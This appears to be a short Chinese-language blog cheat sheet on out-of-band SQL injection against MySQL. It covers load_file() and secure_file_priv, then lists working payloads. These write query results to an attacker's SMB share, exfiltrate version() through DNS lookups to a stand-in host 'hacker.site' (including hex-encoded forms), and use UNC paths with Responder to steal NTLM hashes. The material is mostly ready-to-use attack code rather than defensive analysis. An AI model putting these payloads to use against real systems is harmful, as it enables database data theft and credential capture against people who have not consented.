---
layout: post
title: "SQL injection 文件操作 OOB"
description: ""
date: 2023-07-11
categories:
  - SQL_Injection
  - SQL_Injection_OOB
author: ""
tags: ['SQL_Injection', 'OOB']
---



# SQL injection 文件操作 OOB

###### tags: `sql injection`


## load_file读文件

### 設置Load_file狀態
在MySQL注入中DNSlog外帶主要利用MySQL內置函數load_file()函數，load_file()不僅能讀取本地文件也能通過UNC的方式讀取遠程文件。

### Load_file函數狀態：
要求用户具有file权限 通常root 才有

當secure_file_priv為空，則表示沒有任何限制。

當secure_file_priv為指定目錄，則表示數據庫導入導出只能在指定目錄。

當secure_file_priv為null，則表示不允許導入導出（MySQL 5.7 默認值）

### MySQL中查詢secure_file_priv有以下方式

```
show variables like '%secure%';

select @@global.secure_file_priv;
```

以上部分內容轉載自:
https://www.freebuf.com/articles/web/323674.html



## MYSQL 帶外
這是window 橫向滲透，自己開啟一個共享資料夾(所有人可寫入)，然後把資料帶到自己的資料夾。

```
select @@version into outfile '\\\\192.168.0.100\\temp\\out.txt';
select @@version into dumpfile '\\\\192.168.0.100\\temp\\out.txt;
```

## DNS Log
```
select load_file(concat('\\\\',version(),'.hacker.site\\a.txt'));
select load_file(concat(0x5c5c5c5c,version(),0x2e6861636b65722e736974655c5c612e747874))
```


## UNC 路徑 - NTLM 哈希竊取
需要用 responder 工具。基於錯誤的UNC PATH

```
select load_file('\\\\error\\abc');
select load_file(0x5c5c5c5c6572726f725c5c616263);
select 'osanda' into dumpfile '\\\\error\\abc';
select 'osanda' into outfile '\\\\error\\abc';
load data infile '\\\\error\\abc' into table database.table_name;
```